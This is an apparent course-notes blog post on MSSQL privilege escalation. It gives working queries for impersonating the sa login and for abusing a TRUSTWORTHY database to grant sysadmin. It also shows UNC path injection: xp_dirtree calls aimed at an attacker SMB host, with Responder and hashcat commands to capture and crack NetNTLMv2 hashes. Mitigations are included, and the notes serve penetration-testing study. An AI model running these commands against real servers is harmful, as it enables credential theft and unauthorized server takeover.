---
title: 2. Basic Privilege Escalation Queries
description: MSSQL server enumeration and exploitation series 
date: 2025-04-12 02:47:36 +/-0005
categories: [Active Directory, MSSQL]
tags: [Active Directory, MSSQL, Privilege Escalation, HTB Academy]
---

<style>
  details {
    margin: 20px 0;
  }

  summary {
    font-weight: bold;
    cursor: pointer;
  }

  summary:hover {
    color: #007BFF;
  }

  ul {
    margin-left: 20px;
  }
</style>
---
* TOC
{:toc}

---
The goal is to end up as a login with the **`server-level sysadmin role`**, such as the built-in **`sa`** login, which is comparable to the `BUILTIN\Administrators group` What ever the method used to achieve that; There are many caces we can escalate our privilage from 
- from one login to another.
- from one user to another.
- from one login to a domain user.

> **INFO:** The `sa` login is disabled by default when Windows Authentication Mode is selected during installation.
{: .prompt-info }

---

## üé≠ **Impersonating Logins**

Using `EXECUTE AS` which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them

Which logins are allowed to impersonate which other logins is controlled by server-level IMPERSONATE permissions, stored in the `sys.server_permissions` table.

1. Enumerate all the logins our current login is allowed to impersonate
    
    ```sql
    SELECT name FROM sys.server_permissions
    JOIN sys.server_principals
    ON grantor_principal_id = principal_id
    WHERE permission_name = 'IMPERSONATE';
    ```
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/c9c9532d-10f1-45d5-93cf-d14a1d7b593f/image.png?table=block&id=1c385370-06ca-80d4-b72d-d94edd9149bc&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=Ibi-0-bEgwYKID1K_rVWug9Z6EhcI73rKQF17MFmmcc&downloadName=image.png)
    
    In this case, our login ws_dev is permitted to impersonate the logins ws_user and sa .
    
2. impersonate the sa login
    
    ```sql
    EXECUTE AS LOGIN = 'sa';
    SELECT SYSTEM_USER;
    SELECT IS_ROLEMEMBER('db_owner');
    ```
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/b2bac3e2-4969-4203-8c2d-efa2f279351c/image.png?table=block&id=1c385370-06ca-8009-880b-d892893aee57&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=KUkn6ckl6VoCbNGuElthE3mjk_y2iLK2tEB6MybuB2Y&downloadName=image.png)
    
3. Reverting changes
    
    After impersonating `sa` , all of the following T-SQL queries will execute under their context, until we issue the REVERT
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/2e1ec37d-77fe-47a1-af0d-b36c4afc6050/image.png?table=block&id=1c485370-06ca-8030-83c8-f61e62ed546d&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=wbSeX0xODMDI4-5lRg256I4MdfwKH0D-cHIfKTtcqwk&downloadName=image.png)

---

## **üõ°Ô∏è Abusing Trustworthy Databases in MSSQL**

### üîç What is "Trustworthy" in MSSQL?
The `TRUSTWORTHY` property of a SQL Server **database** indicates whether that database can be trusted to access server-level resources **beyond its scope**, such as modifying server roles or interacting with linked servers.

- **Default:** OFF (for security reasons).
- **Risk:** If **enabled**, and a **user with `db_owner` role** is compromised, it can lead to **server-level privilege escalation** (e.g., assigning `sysadmin` to any login).

### ‚úÖ Requirements for the Attack
    
To successfully abuse a trustworthy database for privilege escalation:

1. **The database must be marked as `TRUSTWORTHY = ON`.**
2. **You must have control over an account with `db_owner` role** within that database.
3. **The server-level login corresponding to the user** must exist (or be creatable).
4. **The user executing the payload must be able to impersonate or escalate to the database owner** (which typically maps to a server-level principal).

### üîé Step-by-Step Breakdown

#### 1. üîç Enumerate Databases and Trust Status

To find all databases, their owners, and whether they're marked as trustworthy:

```sql
SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
FROM sys.databases a
JOIN sys.server_principals b ON a.owner_sid = b.sid;
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/f1b7f294-5661-4765-ad98-5e9ba5a4e5ae/image.png?table=block&id=1c385370-06ca-80c4-ac21-d30a814a877f&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=z2A1wkdRQq7l94o6Cvm8U99uDB_dcG4qkV-wUASt7tY&downloadName=image.png)

- `is_trustworthy_on = 1` ‚Üí candidate for abuse
- Check if you have access to any database where your current login is in the `db_owner` role.

#### 2. üîç Enumerate Database-Level Users and Roles
    
Switch to a target database and list users and their roles:

```sql
USE webshop;
EXECUTE sp_helpuser;
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/d9f843a5-3b0e-44e5-b935-b0a93d2b7b04/image.png?table=block&id=1c385370-06ca-8008-b9a4-dd025d8fd909&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=kfHdWLJ2vOewAcU3O2lbWa_pD86qbNFB681lI4cAbZI&downloadName=image.png)

This stored procedure helps list the users in a particular database along with their roles and permissions [sp-helpuser](ttps://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-helpuser-transact-sql?view=sql-server-ver16).

    
#### 3. üîç Deeper Role Membership Check
    
To check the exact members of the `db_owner` role in that database:

```sql
USE webshop;
SELECT b.name AS role_name, c.name AS member_name
FROM webshop.sys.database_role_members a
JOIN webshop.sys.database_principals b ON a.role_principal_id = b.principal_id
LEFT JOIN webshop.sys.database_principals c ON a.member_principal_id = c.principal_id;
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/7d3cd9aa-9ee7-48dd-9f80-53443ab95881/image.png?table=block&id=1d385370-06ca-8062-bbc6-df0a2d04178e&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=_gk_him0cOnxlLHMwLuTyZ_9bNWS1eoUAV81mNPTHEg&downloadName=image.png)

- This shows who holds which roles.
- Empty names might indicate users you can't see due to permission limits.

#### 4. ‚öôÔ∏è Privilege Escalation Payload
    
Once you have a user in `db_owner` and the DB is trustworthy, you can escalate to `sysadmin`:

```sql
CREATE PROCEDURE sp_privesc
WITH EXECUTE AS OWNER
AS
    EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin';
GO

EXECUTE sp_privesc;
DROP PROCEDURE sp_privesc;
```

- `WITH EXECUTE AS OWNER` ‚Üí temporarily execute with the permission of the database owner, who often maps to a server-level principal.

#### 5. ‚úÖ Verification of sysadmin Privilege
    
Check if the escalation worked:

```sql
REVERT; -- Go back to original context
SELECT SYSTEM_USER; -- Show current login
SELECT IS_SRVROLEMEMBER('sysadmin'); -- Returns 1 if sysadmin
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/2104af50-e607-45e0-8465-3cac63cbcb1d/image.png?table=block&id=1d385370-06ca-80c6-b701-f177f6188560&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=k1fW0RORqDaZCAHlLdEhGhF20z35Ubz-EKqnO_GT0Mc&downloadName=image.png)
        
### üß† Why This Works

- When a DB is `TRUSTWORTHY = ON`, it allows code execution under database-level roles (like `db_owner`) to **act with elevated server-level privileges**.
- The `EXECUTE AS OWNER` clause executes stored procedures as the DB owner, **who might be a sysadmin or a higher privileged server principal**.
- Thus, if an attacker can create and run such a procedure, **they can grant themselves `sysadmin`** or any server-level role.

### üß© Defense & Mitigation

1. **Keep `TRUSTWORTHY` set to OFF** unless absolutely necessary.
2. **Avoid mapping database owners to high-privileged logins (like `sa`)**.
3. **Limit `db_owner` access** only to trusted accounts.
4. **Monitor server roles and audit changes** to `sysadmin` membership.

---


## üß¨ **UNC Path Injection**

### üß† What is It?
    
**UNC Path Injection** is an attack where an attacker **tricks a remote MSSQL server** into making an SMB request to a **malicious server**, allowing the attacker to **capture NetNTLMv2 hashes** of the account that the SQL Server is running under.

> ‚úÖ UNC = Universal Naming Convention
> 
> Example: `\\192.168.1.5\share\file.txt` (used for network paths)
 


### üî• Why Is It Dangerous?
- It can **leak NetNTLMv2 hashes**.
- If SQL Server runs as a **domain user account**, the leaked credentials might have **privileged access** on the domain (e.g., backup accounts or service accounts with elevated rights).
- These hashes can be **cracked offline** or used in **relay attacks**.

### ‚úÖ Requirements
    
    
| Requirement | Description |
| --- | --- |
| MSSQL server accessible | You must be able to interact with the MSSQL instance (SQLi, RCE, or valid login). |
| Ability to run `xp_*` procedures | The user must have permission to execute extended stored procedures like `xp_dirtree`. |
| Attacker-controlled SMB server | Tools like **Responder** or **Impacket SMB server** running on attacker's machine. |
| Outbound SMB allowed | The MSSQL server must be able to make outbound SMB requests (TCP 445). |


### ‚öôÔ∏è Extended Stored Procedures
    
These are **undocumented stored procedures** in SQL Server that interact with the filesystem and **accept UNC paths** (which makes the injection possible):

| Procedure | Description |
| --- | --- |
| `xp_fileexist` | Checks if a file or directory exists (returns result set). |
| `xp_dirtree` | Lists directories and subdirectories of a given path. |
| `xp_subdirs` | Returns subdirectories for a given path. |


### üîç Verifying Usage (Optional)
    
Run this to check if `xp_fileexist` works locally:

```sql
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/d48296aa-1276-4bd6-bfc0-3317a599039b/image.png?table=block&id=1d385370-06ca-8000-bff4-ceae98d4831f&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=5eKiO6A1LvXBA2xQliKV3jknkNhxSPmja_1b3Uvp2hQ&downloadName=image.png)
If the result shows `1`, the function is enabled and working.


### üö® UNC Injection for Hash Capture
    
1. Set up Responder to act as an SMB server on your machine:

    ```bash
    sudo responder -I tun0 -v
    ```

2. Then run **any of the following** on the MSSQL server:

    ```sql
    EXEC xp_dirtree '\\<Your-IP>\share';
    EXEC xp_subdirs '\\<Your-IP>\share';
    EXEC xp_fileexist '\\<Your-IP>\share';
    ```

    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/c587a16e-6e28-42c5-8685-97ab15fba76f/image.png?table=block&id=1d385370-06ca-80e8-812a-eaefc3a7ec23&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=kbMHryqifv_sq9bj5UKskZVFBgFsjqfmvQL7MXG4Ssg&downloadName=image.png)

If successful, MSSQL will try to **authenticate** with the attacker‚Äôs SMB share using the credentials of the SQL service account.

### ü™ù Hash Capture and Cracking
    
After capture a **NetNTLMv2 hash** we need to Crack it using **Hashcat** with the mode `5600`:

```bash
hashcat -m 5600 '<NetNTLMv2_Hash>' /usr/share/wordlists/rockyou.txt
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/a21ebab9-27f1-4b0e-9ab1-fe88cbb0e6d5/image.png?table=block&id=1d385370-06ca-805f-8fdd-cbb642ce76d9&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=omTs6s_6gYRPnxee1QAlgRT3fyf_28pc_qOggAfuJpk&downloadName=image.png)

> If cracked successfully, you now have plaintext credentials of the service account.
> 

### üõ°Ô∏è Mitigation & Defense
    
    
| Defense | Description |
| --- | --- |
| Disable `xp_cmdshell` and `xp_*` procs | Disable unnecessary extended stored procedures. |
| Restrict outbound SMB | Use firewall rules to block outbound SMB connections from SQL Servers. |
| Run MSSQL under least-privileged users | Avoid using domain-level or high-privileged accounts for services. |
| Monitor for unusual SMB activity | Watch for authentication attempts to unknown/untrusted servers. |


### üß© TL;DR ‚Äì Attack Summary

1. **Check for usable extended stored procedures.**
2. **Run `xp_dirtree` or similar with a UNC path pointing to your SMB server.**
3. **Capture NetNTLMv2 hash with Responder.**
4. **Crack the hash with Hashcat (mode 5600).**
5. **Use the recovered credentials for lateral movement or privilege escalation.**